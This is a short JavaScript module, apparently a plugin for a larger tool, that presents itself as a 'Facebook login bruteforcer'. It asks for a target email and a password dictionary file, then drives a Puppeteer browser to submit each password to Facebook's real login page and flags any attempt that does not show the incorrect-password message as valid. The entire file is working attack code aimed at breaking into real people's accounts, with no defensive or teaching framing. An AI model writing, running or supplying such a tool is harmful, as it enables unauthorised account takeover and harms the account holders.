//Dependencies
const Puppeteer = require("puppeteer")

//Main
function info(){
    return {
        "name": "Facebook login bruteforcer",
        "author": "I2rys"
    }
}

function bruteforce(Fs, Chalk, Readline){
    Readline.question(`${Chalk.blueBright("email: ")}`, email=>{
        Readline.question(`${Chalk.blueBright("dictionary: ")}`, async(dictionary)=>{
            var dictionary_data = Fs.readFileSync(dictionary, "utf8")
            dictionary_data = dictionary_data.replace(/\r/g, "").split("\n")

            var dictionary_index = 0

            const browser = await Puppeteer.launch({ headless: false, args: ["--no-sandbox", "--disable-setuid-sandbox"] })
            const page = await browser.newPage()
        
            Check()
            async function Check(){
                if(dictionary_index == dictionary_data.length){
                    await browser.close()

                    console.log(`${info().name} is finished bruteforcing.`)
                    process.exit()
                }
            
                await page.goto("https://www.facebook.com/login", { waitUntil: "networkidle0" })
                await page.type("#email", email)
                await page.type("#pass", dictionary_data[dictionary_index])
                await Promise.all([
                    await page.click("#loginbutton"),
                    await page.waitForNavigation({ waitUntil: "networkidle0", timeout: 0 })
                ])
                
                const page_content = await page.content()

                if(page_content.indexOf("The password you’ve entered is incorrect") == -1){
                    console.log(`Valid password ${dictionary_data[dictionary_index]}`)
                }else{
                    console.log(`Invalid password ${dictionary_data[dictionary_index]}`)
                }

                dictionary_index += 1
                Check()
            }
        })
    })
}

//Exporter
module.exports = {
    info: info,
    bruteforce: bruteforce
}